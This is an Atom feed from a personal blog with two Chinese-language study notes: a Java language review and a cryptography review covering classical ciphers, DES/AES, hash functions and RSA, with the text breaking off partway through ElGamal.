<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Snail</title>
  
  <subtitle>everbodyup</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-01-08T12:41:32.633Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Jason_xi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java_review</title>
    <link href="http://yoursite.com/2019/01/07/java%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/01/07/java复习/</id>
    <published>2019-01-06T16:00:00.000Z</published>
    <updated>2019-01-08T12:41:32.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><ol><li>局部变量在使用前必须给定初值，否则编译出错<br>类成员变量无此要求  </li><li>final  类型    常量名=值;  </li><li>类静态成员常量只能在定义时初始化  </li><li>正数在计算机中是用二进制表示的，负数在计算机中使用补码表示的</li><li>整数默认是 int 类型，小数默认是 double 类型  </li><li>类常量：成员变量同时被static和final修饰，则它在类的所有对象中都有唯一值，且无法改变。一定要在定义时就给定初始值  </li><li>类方法是对整个类而言的，方法体中不能有与对象有关的内容。一些通用的、公用型的方法与类的对象无关，常被作为类方法实现  </li></ol><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><ol><li></li></ol><ul><li>private 同一个类  </li><li>缺省 同一个类/同一个包  </li><li>protected 同一个类/同一个包/不同包子类  </li><li>public 同一个类/同一个包/不同包子类/不同包非子类  </li></ul><p>9.每个类至少有一个构造方法，如果没有显式地定义构造方法，Java会自动提供一个缺省的构造方法    </p><ol><li>类方法中不能使用super、this关键字    </li><li>构造方法中，可用this调用另一构造方法    </li><li>Object类是Java中所有类的直接父类或间接父类      </li><li>子类拥有其父类的所有属性和方法（但父类中说明为private的属性和方法，子类不可直接访问），子类可以对父类的方法覆盖或重载    </li><li>被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载     </li><li>静态成员为该类及该类的所有子类所共有      </li><li>如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，  则这两个静态成员变量相互独立    </li><li><p>构造方法不能被继承，子类的构造方法能确保它的直接父类<br>和间接父类的构造方法都被调用。super()必须放在构造方法第一句。     </p></li><li><p>super：代表父类对象，在继承中有重要作用<br>super可以访问直接父类和间接父类的属性和方法<br>super不能在static环境中使用，包括类变量、类方法和static语句块<br>使用super不能访问本类定义的属性和方法<br>在构造方法中使用时，super语句必须放在第一句<br>在子类的构造方法中，super可以不明确使用，也可以明确使用  </p></li><li><p>子类没有明确使用super，系统自动在构造方法中加上super()，调用直接父类的不带参数的构造方法，父类中没有定义不带参数的构造方法，编译会出错。  </p><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>一、使用父类类型的引用指向子类的对象；</p><p>二、该引用只能调用父类中定义的方法和变量；</p><p>三、如果子类中重写了父类中的一个方法，那么在调用这个方法的时候，将会调用子类中的这个方法；（动态连接、动态调用）</p><p>四、变量不能被重写（覆盖），”重写“的概念只针对方法，如果在子类中”重写“了父类中的变量，那么在编译时会报错。</p></li></ol><p>多态的3个必要条件：  </p><pre><code>1.继承   2.重写   3.父类引用指向子类对象。</code></pre><p>访问变量看声明，访问方法看实际对象类型<br>——————————————————————</p><p>向上转型： Person p = new Man() ; //向上转型不需要强制类型转化<br>向下转型： Man man = (Man)new Person() ; //必须强制类型转化  </p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><ul><li>抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象 </li><li>抽象类中可以包含抽象方法，也可以不包含抽象方法 </li><li>如果类中的某一方法是抽象的，整个类就必须被说明成抽象的  </li><li>抽象方法在子类中必须被实现，否则子类仍是抽象的  </li></ul><h1 id="final类"><a href="#final类" class="headerlink" title="final类"></a>final类</h1><p>所有被private修饰符限定，以及所有包含在final类中的方法，都被默认为是final的。因为这些方法不能被子类所继承，所以不能被重载，自然都是最终方法</p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口定义了一些没有实现的方法和静态常量集：  </p><ol><li>接口和类的区别：  </li></ol><ul><li>类只能单继承，而接口可以多继承    </li><li>类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的  </li><li>接口中的方法要用类来实现，一个类可以实现多个接口     </li></ul><ol><li>接口中的成员变量：都是隐含public、static、final的——静态最终变量（常量）   </li><li>接口中的方法都是抽象方法，所有方法隐含public和abstract    </li><li>接口可以作为引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，   </li><li>在设计多态的时候，基础类还可以使用抽象类和接口，可以使程序更清晰，并避免一些容易疏忽的错误。编程者可以自由决定向上转型为一个普通类，一个抽象类或一个接口    </li><li>编译运行带包的java文件 <code>javac -d . test.java</code> <code>java packagename.test</code>    </li></ol><h1 id="变量及其传递"><a href="#变量及其传递" class="headerlink" title="变量及其传递"></a>变量及其传递</h1><p>1.栈：存放所引用对象的堆首地址，称作对象引用值(或对象地址值)<br>2.堆：存放对象中成员变量、方法等内容，称作对象实体值    </p><ul><li><p>按值传递: 当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变   </p></li><li><p>按引用传递: 当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变    </p></li></ul><p>3.Java按值传递所有参数, 制作所有参数的副本, 而不管它们的类型  </p><ol><li><p>对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，不能反映到实参在形参中修改了对象引用。     </p></li><li><p>java程序设计语言对对象采用的不是引用调用，实际上是对象引用进行的是值传递，当然在这里我们可以简单理解为这就是按值调用和引用调用的区别，而且必须明白即使java函数在传递引用数据类型时，也只是拷贝了引用的值罢了，之所以能修改引用数据是因为它们同时指向了一个对象，但这仍然是按值调用而不是引用调用。   </p></li></ol><p>6.==和!=用来比较引用型变量时, 只能判断运算符两边引用的是不是同一个对象, 即对象的地址值（或对象引用值）是不是相同   </p><ol><li>比较两个对象的内容(对象实体值)是否相同用equals()  <h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1>内部类对象的创建: 创建非静态内部类的对象时一定要确保已经有一个外部类对象    </li></ol><p>example: 外部类Goods 内部类 Content,GDestionation<br> Goods g1=new Goods();<br> Goods.Content c1=g1.new Content();<br> Goods.GDestination d1=g1.new GDestionation(“Beijing”));  </p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><ol><li>异常处理机制：抛出异常——捕捉异常。<br>出现错误，方法都会产生一个异常对象，异常对象将交由运行系统来处理——抛出(throwing)异常。      </li></ol><ul><li>系统抛出。      </li><li>用户自定义抛出。        </li></ul><ol><li>运行系统开始寻找合适的处理方法来处理这个异常。如果系统找到了适合的处理该异常的方法——捕获异常 。     </li><li>编译器强制要求Java程序必须捕获或声明抛出所有非运行时异常  </li><li>throws: 声明抛出异常：不捕获异常，而是将异常交由上一层处理，在其他地方捕获异常  </li></ol><p>5.throw: 一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句放到if分支中<br>含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常             </p><ol><li><p><img src="https://i.imgur.com/c8oDcK9.png" alt="">   </p></li><li><p>异常在编译时是否被检测区分，异常分运行时异常:如除数为零，错误的强制类型转换、数组越界访问、空引用      </p></li></ol><p>非运行时异常:找不到指定的文件等，不是程序本身的错误     </p><h1 id="基本类"><a href="#基本类" class="headerlink" title="基本类"></a>基本类</h1><h2 id="java-lang"><a href="#java-lang" class="headerlink" title="java.lang"></a>java.lang</h2><p>Object: Java中整个类层次结构的根节点<br>Class:  为运行时搜集的信息<br>Math:  提供数学常数及各种函数<br>System: 提供对操作系统的访问，包括默认的I/O流环境变量、自动垃圾收集、系统时间和系统属性<br>Runtime: 提供了操作系统的访问<br>Thread: 和Runnable接口协同作用提供Java中的多线程的支持<br>Throwable: Java中所有异常(Exception)的基类  </p><p>String类: 不可改变的静态字符串<br>用于代表不变的字符串，并定义了类似查找，比较和连接字符的操作<br>所有字符串常量都是String对象，存储在String Pool（字符串池）中，字符串池是常量池的一部分<br>StringBuffer类: 动态可变的字符串<br>StringBuilder类：动态可变的字符串（≥ jdk1.5）  </p><p>example:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String a=<span class="string">"hellojava"</span>;</span><br><span class="line">String b=<span class="string">"java"</span>;</span><br><span class="line">String c=<span class="string">"hello"</span>+b;</span><br><span class="line"><span class="keyword">if</span>(a==c)&#123;     </span><br><span class="line">    System.out.println(<span class="string">"相等"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;     </span><br><span class="line">    System.out.println(<span class="string">"不等"</span>);          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>字面量”+”拼接是在编译期间进行的，拼接后的字符串存放在字符串池中；而字符串引用的”+”拼接运算实在运行时进行的，新创建的字符串存放在堆中。     </p><h1 id="java-util"><a href="#java-util" class="headerlink" title="java.util"></a>java.util</h1><p>hashmap&amp;&amp;hashtable<br>哈希表（Hashtable）是一种支持对元素进行快速检索的线性表，主要特征是表中元素的平均检索时间与表中的元素个数无关，因为哈希表是利用“关键字K—元素V”的形式进行存储的列表    </p><p>关键字的值全表唯一，可通过关键字查找到对应的元素。关键字K和元素V的类型不能是基本数据类型， 任何非null 对象都可以用作键或值     </p><h1 id="java-io"><a href="#java-io" class="headerlink" title="java.io"></a>java.io</h1><ol><li>InputStream和OutputStream是所有面向字节的输入输出流的超类    </li><li>Reader和Writer是所有面向字符的输入输出流的超类。   </li><li>FileInputStream和FileOutputStream的数据源都是文件，用于进行文件输入输出的处理 ,FileInputStream:封装了从文件中读取字节的功能,该类是用来读取字节文件的，如图像文件，如果读取字符或者文本文件，则最好使用FileReader类.     </li></ol><p>读数据<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">//BufferedReader br = new BufferedReader(new FileReader("demo.txt"));</span></span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">"wjx.txt"</span>),<span class="string">"gbk"</span>));</span><br><span class="line"><span class="comment">/*方法1*/</span></span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">while</span> ((s = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>写数据<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriterDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">PrintWriter pw = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span>  FileWriter(<span class="string">"demo.txt"</span>)));</span><br><span class="line">pw.println(<span class="string">"This is just a test!"</span>);</span><br><span class="line">pw.println(<span class="string">"hahahhahhh"</span>);</span><br><span class="line">pw.close();</span><br><span class="line">System.out.println(<span class="string">"write ok!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h2 id="多线程-1"><a href="#多线程-1" class="headerlink" title="多线程"></a>多线程</h2><p>两种方法：<br>声明一个 Thread 类的子类，并覆盖 run() 方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 覆盖该方法*/</span> </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>声明一个实现 Runnable 接口的类，并实现 run() 方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/* 实现该方法*/</span> </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h2><p>同步代码块<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(myObject) &#123;  <span class="comment">// myobject是任意的对象引用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h2><p>将同步和锁封装成对象，并将操作锁的隐式动作转换为显示动作<br>Lock接口（java.util.concurrent.locks）<br>已知实现类： ReentrantLock<br>     Lock l = …;<br>     l.lock();<br>     try {<br>         // access the resource protected by this lock<br>     } finally {<br>         l.unlock();<br>     }<br>锁定和取消锁定出现在不同作用范围中时，必须谨慎地确保保持锁定时所执行的所有代码用 try-finally 或 try-catch 加以保护，以确保在必要时释放锁    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;局部变量在使用前必须给定初值，否则编译出错&lt;br&gt;类成员变量无此要求  &lt;/li&gt;
&lt;li&gt;final  类型    常量名=值
      
    
    </summary>
    
      <category term="java" scheme="http://yoursite.com/categories/java/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>密码学复习</title>
    <link href="http://yoursite.com/2019/01/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/01/05/密码学复习/</id>
    <published>2019-01-04T16:00:00.000Z</published>
    <updated>2019-01-07T07:16:51.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h2 id="仿射"><a href="#仿射" class="headerlink" title="仿射"></a>仿射</h2><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><pre><code>加密变换：  𝐶＝ 𝑘1∗𝑚＋𝑘2 𝑚𝑜𝑑 26  </code></pre><p>𝐾1=1时，移位密码<br>𝐾2=1时，乘数密码<br>     解密变换：  𝑚＝ (𝐶−𝑘2)∗〖𝑘1〗^(−1) 𝑚𝑜𝑑 26</p><p>密钥空间: n(n)</p><h2 id="Playfair"><a href="#Playfair" class="headerlink" title="Playfair"></a>Playfair</h2><h3 id="加解密-1"><a href="#加解密-1" class="headerlink" title="加解密"></a>加解密</h3><p>对每一对明文𝑚1, 𝑚2加密如下：<br>若𝑚1和𝑚2同行，则密文𝑐1和𝑐2分别紧靠𝑚1，𝑚2右端的字母，其中第一列看做最后一列的右方<br>若𝑚1和𝑚2同列，则密文𝑐1和𝑐2分别是紧靠𝑚1，𝑚2下方的字母，其中第一行看做最后一行的下方<br>若𝑚1和𝑚2不同行也不同列，则𝑐1和𝑐2是𝑚1，𝑚2确定的矩形的其他两角的字母，并𝑐1和𝑚1，𝑐2和𝑚2同行<br>若出现重复字母，即𝑚1=𝑚2，则在其中插入字母Q<br>如明文字母是单数，将Q放在明文的末端<br>      llylq ly<br>      查表：<br>             QZ  KZ</p><p>密钥空间：25！</p><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h2><h3 id="加解密-2"><a href="#加解密-2" class="headerlink" title="加解密"></a>加解密</h3><p>密钥：𝑘=𝑘1𝑘2𝑘3 · · · 𝑘𝑛<br>明文：𝑚=𝑚1𝑚2𝑚3 · · · 𝑚𝑛 </p><p>加密：𝐸(𝑚)=𝐶=𝑐1𝑐2𝑐3 · · · 𝑐𝑛<br>                      𝑐𝑖=𝑚𝑖+𝑘_𝑖  𝑚𝑜𝑑 26</p><p>解密：𝑚𝑖=𝑐𝑖−𝑘_𝑖 𝑚𝑜𝑑 26</p><p>密钥空间：26^m</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="穷举分析"><a href="#穷举分析" class="headerlink" title="穷举分析"></a>穷举分析</h3><p>蛮力攻击的次数：</p><ol><li>加同余密码：明文为英文字母表时，𝑘只有25种可能值。明文为8位扩展ASCII码时，𝑘只有255种值。穷举即可</li><li>乘数密码更易破译。密钥𝑘要满足条件(n, k )＝1，即𝑘只有≤ (n)个不同取值。去掉𝑘＝1恒等情况，𝑘只有(n)－1种<br>明文为英文字母表时，𝑘只能取3，5，7，9，11，15，17，19，21，23，25共11种不同值</li><li>仿射密码保密性好一些。但密钥也只有n(n)－1种。(𝑚𝑖∗𝑘1+𝑘2 ，去掉 𝑚𝑖∗1+0)<br>对英文字母表的情况，密钥只有26×12－1＝311种<br>古代密码分析者用穷举法破译可能会有一定困难，但对计算机来说微不足道</li></ol><h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h1><p>攻击者知道密码算法<br>方式分为:</p><ul><li><p>唯密文攻击（Ciphertext-only attack）—被动攻击<br>密码分析者仅能根据截获的密文进行分析，以得出明文或密钥。<br>穷举攻击和统计分析都是唯密文攻击</p></li><li><p>已知明文攻击（Plaintext-known attack） —被动攻击<br>密码分析者除了有截获的密文外，还有一些已知的“明文—密文对”来破译密码   </p></li><li><p>选择明文攻击（Chosen-plaintext attack） —主动攻击<br>密码分析者除得到一些“明文—密文对”外，还可以选择被加密的明文，并获得相应的密文；密码破译者暂时控制<strong>加密机</strong><br>变体：自适应选择明文攻击（Adaptive-chosen-plaintext attack）</p></li><li><p>选择密文攻击(Chosen-ciphertext attack) —主动攻击<br>指密码分析者可以选择一些密文，并得到相应的明文；密码破译者暂时控制<strong>解密机</strong></p></li></ul><p>自适应选择密文攻击（Adaptive-chosen-ciphetext attack ）</p><h1 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ol><li><p>DES：明文分组和密文分组均为64比特，有效密钥56比特</p></li><li><p>DES由初始置换，16轮迭代，逆初始置换组成</p></li><li><p>DES的加解密算法相同，只是解密子密钥与加密子密钥的使用顺序相反</p></li></ol><p>加解密<br><img src="https://i.imgur.com/nD6pEK7.png" alt=""><br>16轮迭代<br><img src="https://i.imgur.com/cZkvuUR.png" alt=""><br>S盒计算<br><img src="https://i.imgur.com/XBtU1D5.png" alt=""><br>密钥产生<br><img src="https://i.imgur.com/jBguSYc.png" alt="">   </p><h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><p>二重DES不能提高密钥长度，抵抗穷举攻击不能抵抗中途相遇攻击。(57bit)</p><p>三重DES：<br>    EEE3：C=EK1(EK2(EK3(P)))<br>    EDE3：C=EK1(DK2(EK3(P)))<br>    EEE2：C=EK1(EK2(EK2(P)))<br>    EDE2：C=EK1(DK2(EK1(P)))或者C=EK1(DK1(EK2(P)))<br>密钥长度增加到112bit或168bit。避免了穷举攻击</p><h3 id="数学语言描述"><a href="#数学语言描述" class="headerlink" title="数学语言描述"></a>数学语言描述</h3><p><img src="https://i.imgur.com/vVhlIFD.png" alt=""></p><h3 id="安全性能分析"><a href="#安全性能分析" class="headerlink" title="安全性能分析"></a>安全性能分析</h3><ol><li><p>DES存在一些弱密钥和半弱密钥</p></li><li><p>DES的56位密钥无法抵抗穷举攻击</p></li><li><p>代数结构存在互补对称性</p></li></ol><p>    弱密钥：用相同的密钥两次加密后，结果等于明文，存在4个。<br>         𝑬𝒌(𝑬𝒌(𝒎))= 𝒎  和  𝑫𝒌(𝑫𝒌(𝒎))= 𝒎</p><p>    半弱密钥：两个不同的密钥，他们加密的结果相同，至少有12个。<br>        𝐸<em>(𝑘^′ ) (𝐸</em>𝑘 (𝑚))=𝐸<em>𝑘 (𝐸</em>(𝑘^′ ) (𝑚))=𝑚              </p><p>互补性 </p><ol><li>互补性使DES在选择明文攻击下所需的工作量减半（2^55）<br> c1=Ek(m) c2=Ek(~m)   ~c2=E~k(m)<br>所以对𝑚加密，如果密文为𝑐1，则加密密钥为𝑘, 如果密文为~c2,则加密密钥为~𝑘</li></ol><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><p>采用SP结构的迭代型分组密码<br>分组长度和密钥长度都可变，各自可以为128、192、256比特</p><p>加解密<br><img src="https://i.imgur.com/gTgxnAB.png" alt=""><br>密钥扩展<br>对𝑤数组扩展40个新列，构成44列的密钥数组：<br>如果𝑖不是4的倍数，则第𝑖列为：<br>    𝑤[𝑖]=𝑤[𝑖−4]⊕𝑤[𝑖−1]<br>如果𝑖是4的倍数，则第𝑖列为：<br>    𝑤[𝑖]=𝑤[𝑖−4]⊕𝑇(𝑤[𝑖−1])</p><p><img src="https://i.imgur.com/0LzVPMj.png" alt=""><br>T函数：字循环、字节代换和轮常量异或</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><ol><li>加密解密不一致，避免弱密钥</li><li>抵抗差分分析和线性分析</li><li>密钥穷举攻击平均需要2^127次AES运算</li></ol><h2 id="DES和AES"><a href="#DES和AES" class="headerlink" title="DES和AES"></a>DES和AES</h2><ol><li>相同之处<br>二者的轮函数都是由三层构成，非线性层、线性混合层、子密钥异或，只是顺序不同<br>AES的子密钥异或对应于DES中S盒之前的子密钥异或<br>AES的列混合运算的目的是让不同的字节相互影响，而DES中F函数的输出与左边一半数据相加也有类似的效果<br>AES的非线性运算是字节代替(ByteSub)，对应于DES中惟一的非线性运算S盒<br>行移位运算保证了每一行的字节不仅仅影响其它行对应的字节，而且影响其它行所有的字节，这与DES中置换P相似</li></ol><p>2.不同之处<br>AES的密钥长度(128位、192位、256位)是可变的，而DES的密钥长度固定为56位<br>DES是面向比特的运算，AES是面向字节的运算<br>AES的加密运算和解密运算不一致，因而加密器不能同时用作解密器，DES则无此限制</p><h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><p>明文错误扩散： 加密前明文某个错误对解密后恢复明文的影响。<br>密文错误扩散： 加密后密文某个错误对解密后恢复明文分组的影响。</p><p><img src="https://i.imgur.com/dqgrU10.png" alt=""><br>CBC<br><img src="https://i.imgur.com/IKqy9xf.png" alt=""></p><p>CFB和OFB解密将P和C互换位置<br>CFB<br><img src="https://i.imgur.com/1gRqwGI.png" alt=""><br>OFB<br><img src="https://i.imgur.com/3VZmWXn.png" alt=""><br>CTR<br><img src="https://i.imgur.com/a5XPzIs.png" alt=""><br><img src="https://i.imgur.com/Odoc6MR.jpg" alt=""></p><h1 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h1><h2 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h2><ol><li>线性反馈移位寄存器(liner feedback shift register,LFSR)是一种特殊的FSR，其反馈函数是移位寄存器中某些位的异或，参与运算的这些位叫做抽头位</li><li>选择合适反馈函数可使序列周期达到最大值2^n -1，周期达到最大值的序列称为m序列</li><li>若n次不可约多项式𝑝(𝑥)的阶为2^𝑛－1，则称𝑝(𝑥)是n次本原多项式</li></ol><h1 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>函数 y=H(x)满足    </p><ol><li>将任意长度的比特串x压缩成为固定长度的比特串y   </li><li>已知x，计算y=H(x)很容易；已知y，找一个x满足y=H(x)在计算上不可行——单向性   </li><li>找(x1，x2)，x1≠x2，满足H(x1)= H(x2)在计算上是不可行的———抗碰撞性<br>这样的函数称为杂凑函数(Hash函数)    </li></ol><h2 id="数据填充"><a href="#数据填充" class="headerlink" title="数据填充"></a>数据填充</h2><p>填充的方法是填充一个1和n个0，信息的长度就为N*512+448(bit),将原始消息长度用64位附加在填充结果后，消息长度为512比特整数倍。</p><h2 id="安全性-1"><a href="#安全性-1" class="headerlink" title="安全性"></a>安全性</h2><ol><li>单向性</li><li><p>抗弱碰撞性<br>对任意给定的消息𝑚，寻找与𝑚不同的消息𝑚’，使得ℎ(𝑚)=ℎ(𝑚’)在计算上不可行</p></li><li><p>抗强碰撞性：<br>寻找任意两个不同的消息𝑚和𝑚’,使得ℎ(𝑚)=ℎ(𝑚’)在计算上不可行</p></li></ol><h1 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>基于大整数分解问题</p><ol><li><p>密钥的生成</p><ol><li>选择两个大素数 𝑝和𝑞,（𝑝≠𝑞，需要保密，步骤4以后建议销毁）  </li><li>计算n=pq。计算φ(n)=(p-1)(q-1)<br>3.随机选择一个整数e，条件是1&lt; e &lt; φ(n)，gcd(e,φ(n))=1</li><li>计算ed ≡ 1 (mod φ(n)) (e对于φ(n)的模反元素d)<br>得到：公钥为{𝑒, 𝑛}； 私钥为{𝑑}<br>加密(用𝒆，𝒏)： 明文𝑀&lt;𝑛， 密文𝐶=𝑀^𝑒 (𝑚𝑜𝑑 𝑛).<br>解密(用𝒅，𝒏)： 密文𝐶， 明文𝑀 =𝐶^𝑑 (𝑚𝑜𝑑 𝑛)        </li></ol></li><li><p>正确性验证<br>1.若gcd⁡(𝒎,𝒏)=𝟏,<br>𝐶𝑑 𝑚𝑜𝑑 𝑛=(𝒎^𝒆)𝑑 𝑚𝑜𝑑 𝑛 =𝒎^𝒆𝒅  𝑚𝑜𝑑 𝑛≡𝑚 𝑚𝑜𝑑 𝑛<br>2.若gcd⁡(𝒎,𝒏)&gt;𝟏,由于𝒏=𝒑𝒒,所以gcd⁡(𝒎,𝒏)必含𝒑,𝒒之一，设gcd⁡(𝒎,𝒏)=𝒑或𝒎=𝒄𝒑, 𝟏≤𝒄≤𝒒,由欧拉定理得：<br>𝒎^(𝝋(𝒒))=𝟏(𝒎𝒐𝒅 𝒒).<br>𝒎^(𝒒−𝟏)(𝒑−𝟏)𝒌=𝟏(𝒎𝒐𝒅 𝒒)<br> 即 𝒎^(𝒌𝝋(n))=𝟏(𝒎𝒐𝒅 𝒒) 或 𝟏=𝒎^(𝒌𝝋(n))+𝒉𝒒<br> 由假定𝒎=𝒄𝒑得：<br>   𝒎=𝒎^(𝒌𝝋(n)+𝟏)+𝒄𝒉𝒑𝒒=𝒎^(𝒌𝝋(n)+𝟏)+𝒂𝒏 (其中𝒂=𝒄𝒉),<br>即𝒎^(𝒌𝝋(n)+𝟏)=𝒎 (𝒎𝒐𝒅 𝒏)        </p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3></li><li>选择密文攻击：不要用RSA对陌生消息进行签名，签名前先使用散列函数加密</li><li>公共模攻击：不要使用相同的模数n</li><li>小加密指数攻击：选择大加密指数</li><li>小解密指数攻击：选择大解密指数</li><li>时间性攻击：使用随机延迟或盲化。</li></ol><h2 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h2><h2 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h2><p>基于有限域上的离散对数问题。</p><p>1.密钥的生成<br>   选取大素数𝑝，𝑔∈〖𝑍_𝑝〗^∗是一个生成元，𝑝,𝑔 作为系统参数所有用户共享<br>   系统中每个用户U都随机挑选整数𝑥，2≤𝑥≤ 